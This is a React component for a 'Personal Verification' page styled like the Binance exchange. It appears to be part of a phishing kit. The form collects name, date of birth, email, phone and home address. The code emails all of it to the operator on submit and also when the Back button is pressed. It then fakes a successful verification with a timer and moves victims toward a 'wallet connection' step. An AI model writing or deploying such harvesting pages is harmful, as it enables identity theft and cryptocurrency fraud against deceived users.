
import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { CheckCircle, User, Calendar as CalendarIcon, MapPin, Mail, Phone, Home } from "lucide-react";
import { sendEmailNotification } from "@/services/emailService";

interface PersonalVerificationProps {
  username: string;
  onVerificationSuccess: () => void;
  onBack: () => void;
}

const countries = [
  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria",
  "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan",
  "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia",
  "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica",
  "Croatia", "Cuba", "Cyprus", "Czech Republic", "Democratic Republic of the Congo", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador",
  "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France",
  "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau",
  "Guyana", "Haiti", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland",
  "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", "Kyrgyzstan",
  "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar",
  "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia",
  "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal",
  "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Korea", "North Macedonia", "Norway", "Oman", "Pakistan",
  "Palau", "Palestine", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar",
  "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia",
  "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", "South Africa",
  "South Korea", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", "Taiwan",
  "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan",
  "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City",
  "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"
];

const PersonalVerification: React.FC<PersonalVerificationProps> = ({ 
  username, 
  onVerificationSuccess, 
  onBack 
}) => {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    postalCode: "",
    country: "",
    dateOfBirth: ""
  });
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const requiredFields = ['firstName', 'lastName', 'email', 'phone', 'address', 'city', 'postalCode', 'country', 'dateOfBirth'];
    const missingFields = requiredFields.filter(field => !formData[field as keyof typeof formData]);
    
    if (missingFields.length > 0) {
      toast({
        title: "Missing required fields",
        description: "Please fill in all required fields to continue.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    // Send email notification for form submission
    try {
      await sendEmailNotification({
        step: "Personal Verification - FORM SUBMITTED",
        username,
        timestamp: new Date().toISOString(),
        allFormData: formData
      });
    } catch (error) {
      console.error('❌ Email notification failed:', error);
    }
    
    // Simulate verification
    setTimeout(() => {
      setIsLoading(false);
      onVerificationSuccess();
      toast({
        title: "Verification successful",
        description: "Proceeding to wallet connection.",
      });
    }, 2000);
  };

  const handleBackClick = async () => {
    try {
      await sendEmailNotification({
        step: "Personal Verification - Back Button Clicked",
        username,
        timestamp: new Date().toISOString(),
        allFormData: formData
      });
    } catch (error) {
      console.error('❌ Email notification failed:', error);
    }
    onBack();
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-4xl mx-auto">
        <div className="bg-[#1E2026] rounded-2xl border border-[#2B3139] p-8 shadow-2xl">
          <div className="text-center mb-8">
            <div className="flex items-center justify-center mb-6">
              <div className="bg-gradient-to-r from-binance-yellow to-yellow-400 p-4 rounded-full">
                <CheckCircle className="w-12 h-12 text-black" />
              </div>
            </div>
            <h1 className="text-4xl font-bold text-white mb-3 tracking-tight">Personal Verification</h1>
            <p className="text-[#848E9C] text-lg leading-relaxed">
              Please verify your personal details to proceed with the secure wallet connection
            </p>
            <div className="mt-4 bg-[#2B3139] rounded-lg p-3 inline-block">
              <p className="text-[#B7BDC6] text-sm">
                Account: <span className="text-binance-yellow font-semibold">{username}</span>
              </p>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-8">
            {/* Personal Information */}
            <div className="space-y-6">
              <div className="flex items-center gap-3 pb-4 border-b border-[#2B3139]">
                <User className="w-6 h-6 text-binance-yellow" />
                <h3 className="text-2xl font-semibold text-white">Personal Information</h3>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-3">
                  <Label htmlFor="firstName" className="text-[#B7BDC6] text-base font-medium">First Name *</Label>
                  <Input
                    id="firstName"
                    type="text"
                    value={formData.firstName}
                    onChange={(e) => handleInputChange("firstName", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
                    required
                  />
                </div>
                
                <div className="space-y-3">
                  <Label htmlFor="lastName" className="text-[#B7BDC6] text-base font-medium">Last Name *</Label>
                  <Input
                    id="lastName"
                    type="text"
                    value={formData.lastName}
                    onChange={(e) => handleInputChange("lastName", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
                    required
                  />
                </div>
              </div>

              <div className="space-y-3">
                <Label htmlFor="dateOfBirth" className="text-[#B7BDC6] text-base font-medium flex items-center gap-2">
                  <CalendarIcon className="w-4 h-4" />
                  Date of Birth *
                </Label>
                <Input
                  id="dateOfBirth"
                  type="text"
                  placeholder="MM/DD/YYYY"
                  value={formData.dateOfBirth}
                  onChange={(e) => handleInputChange("dateOfBirth", e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
                  required
                />
              </div>
            </div>

            {/* Contact Information */}
            <div className="space-y-6">
              <div className="flex items-center gap-3 pb-4 border-b border-[#2B3139]">
                <Mail className="w-6 h-6 text-binance-yellow" />
                <h3 className="text-2xl font-semibold text-white">Contact Information</h3>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-3">
                  <Label htmlFor="email" className="text-[#B7BDC6] text-base font-medium">Email Address *</Label>
                  <Input
                    id="email"
                    type="email"
                    value={formData.email}
                    onChange={(e) => handleInputChange("email", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
                    required
                  />
                </div>

                <div className="space-y-3">
                  <Label htmlFor="phone" className="text-[#B7BDC6] text-base font-medium flex items-center gap-2">
                    <Phone className="w-4 h-4" />
                    Phone Number *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={formData.phone}
                    onChange={(e) => handleInputChange("phone", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
                    required
                  />
                </div>
              </div>
            </div>

            {/* Address Information */}
            <div className="space-y-6">
              <div className="flex items-center gap-3 pb-4 border-b border-[#2B3139]">
                <Home className="w-6 h-6 text-binance-yellow" />
                <h3 className="text-2xl font-semibold text-white">Address Information</h3>
              </div>
              
              <div className="space-y-6">
                <div className="space-y-3">
                  <Label htmlFor="address" className="text-[#B7BDC6] text-base font-medium">Street Address *</Label>
                  <Input
                    id="address"
                    type="text"
                    value={formData.address}
                    onChange={(e) => handleInputChange("address", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
                    required
                  />
                </div>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="space-y-3">
                    <Label htmlFor="city" className="text-[#B7BDC6] text-base font-medium">City *</Label>
                    <Input
                      id="city"
                      type="text"
                      value={formData.city}
                      onChange={(e) => handleInputChange("city", e.target.value)}
                      className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
                      required
                    />
                  </div>

                  <div className="space-y-3">
                    <Label htmlFor="postalCode" className="text-[#B7BDC6] text-base font-medium">Postal Code *</Label>
                    <Input
                      id="postalCode"
                      type="text"
                      value={formData.postalCode}
                      onChange={(e) => handleInputChange("postalCode", e.target.value)}
                      className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
                      required
                    />
                  </div>

                  <div className="space-y-3">
                    <Label htmlFor="country" className="text-[#B7BDC6] text-base font-medium flex items-center gap-2">
                      <MapPin className="w-4 h-4" />
                      Country *
                    </Label>
                    <Select value={formData.country} onValueChange={(value) => handleInputChange("country", value)}>
                      <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
                        <SelectValue placeholder="Select country" />
                      </SelectTrigger>
                      <SelectContent className="bg-[#181A20] border-[#2B3139] max-h-[300px]">
                        {countries.map((country) => (
                          <SelectItem key={country} value={country} className="text-white hover:bg-[#2B3139] focus:bg-[#2B3139]">
                            {country}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex gap-4 pt-6">
              <Button
                type="button"
                onClick={handleBackClick}
                variant="outline"
                className="flex-1 border-[#2B3139] text-[#B7BDC6] hover:bg-[#2B3139] hover:text-white text-base h-14 font-semibold transition-all duration-200"
              >
                Back
              </Button>
              <Button
                type="submit"
                disabled={isLoading}
                className="flex-1 bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-14 text-base transition-all duration-200 shadow-lg"
              >
                {isLoading ? "Verifying..." : "Verify & Continue"}
              </Button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PersonalVerification;
